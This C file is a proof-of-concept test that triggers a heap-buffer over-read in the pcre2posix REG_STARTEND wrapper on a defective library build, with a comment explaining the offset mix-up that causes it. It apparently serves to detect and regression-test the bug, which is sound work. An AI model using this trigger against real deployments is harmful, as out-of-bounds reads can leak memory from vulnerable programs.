/* Proof-of-concept probe for the pcre2posix REG_STARTEND over-read.

   Drives the PUBLIC POSIX wrapper API (regcomp/regexec via pcre2posix.h) with
   fully in-contract input: a REG_STARTEND match over a caller-delimited,
   non-NUL-terminated subject buffer with 0 <= rm_so <= rm_eo <= buffer length.

   On a correct library, regexec() matches the region subject[rm_so .. rm_eo)
   and returns REG_NOMATCH (the pattern does not occur). On the defective tree
   it passes rm_eo (the absolute end offset) to pcre2_match() as the *length*
   while also advancing the subject pointer by rm_so, so the matcher scans
   subject[rm_so .. rm_so + rm_eo) and reads rm_so code units past the end of
   the heap buffer -> AddressSanitizer heap-buffer-overflow READ. */

#include <stdlib.h>
#include <string.h>

#include "pcre2posix.h"

int main(void)
{
  regex_t re;
  regmatch_t pmatch[1];
  char *subject;
  int rc;

  const size_t n = 64;   /* buffer length / end offset */
  const size_t so = 16;  /* start offset (in contract: 0 <= so <= n) */

  /* A pattern that does not occur in the subject, so the engine scans the
     whole REG_STARTEND region looking for a candidate start. */
  if (regcomp(&re, "Z", 0) != 0)
    return 2;

  /* Exactly-sized, deliberately NOT NUL-terminated: REG_STARTEND delimits the
     subject with rm_so/rm_eo, so no terminator is required or present. */
  subject = (char *)malloc(n);
  if (subject == NULL)
  {
    regfree(&re);
    return 2;
  }
  memset(subject, 'a', n);

  pmatch[0].rm_so = (regoff_t)so;
  pmatch[0].rm_eo = (regoff_t)n;

  rc = regexec(&re, subject, 1, pmatch, REG_STARTEND);

  free(subject);
  regfree(&re);

  return (rc == REG_NOMATCH) ? 0 : 1;
}
